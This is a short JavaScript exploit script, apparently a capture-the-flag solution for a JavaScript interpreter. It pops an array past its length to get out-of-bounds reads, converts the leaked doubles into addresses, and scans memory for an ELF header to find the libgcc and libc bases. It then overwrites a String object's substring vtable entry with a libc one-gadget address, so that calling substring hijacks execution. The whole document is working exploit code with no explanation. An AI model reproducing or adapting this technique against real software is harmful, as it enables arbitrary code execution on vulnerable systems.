function Int2Array(val) {
    var res = [];
    var hexed = ('0000000000000000' + val.toString(16)).substr(-16);
    for (var i = 0; i < 16; i+=2)
        res.push(parseInt(hexed.substr(i,2), 16));
    return res;
}

function toDouble(val) {
    var buffer = new ArrayBuffer(8);
    var byteView = new Uint8Array(buffer);
    var view = new Float64Array(buffer);

    byteView.set(Int2Array(val).reverse());
    return view[0];
};

function fromDouble(val) {
    var buffer = new ArrayBuffer(8);
    var view = new Float64Array(buffer);
    view[0] = val;
    return new Uint8Array(buffer, 0, view.BYTES_PER_ELEMENT);
};

function readmem(arg){
    res = "";
    bytes = fromDouble(arg);
    for (var i = 0; i < bytes.length; i++){
        res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);
    }
    return parseInt(res, 16);
}

function findELF(arr, start, len) {
    for(var i=start; i<start+len; i++){
        val = fromDouble(arr[i])
        if ((val[0]==0x7f)&&(val[1]==0x45)&&(val[2]==0x4c)&&(val[3]==0x46)){
            return i;
        }
    }
    return false;
}

a1=[1,2];
a2=[3,4]; // for leak
a3=new String("abcd"); // for rip control (vftable overwrite)
a1.pop();
a1.pop();
a1.pop();
a2_addr = readmem(a1[5]);
a1_base = a2_addr - 0x40;

libgcc_idx = findELF(a1, 0x150000, 0x100000);
libgcc_base = a1_base + libgcc_idx*8;
libc_base = libgcc_base + 0x216000;
is_oldlibc = 0; // change this. 
if (is_oldlibc) {
    libc_oneshot = libc_base + 0xF0897; // md5(libc-2.23.so)=="d443f227870b9c29182cc7a7a007d881"
} else {
    libc_oneshot = libc_base + 0xF0567; // md5(libc-2.23.so)=="a3e78b9d154d9d0936d3a1fda1743479"
}

vftable_idx = 0x37 // index of String.substring
a1[vftable_idx] = toDouble(libc_oneshot); // String.substring vftable overwrite

a3.substring(); // pwn!
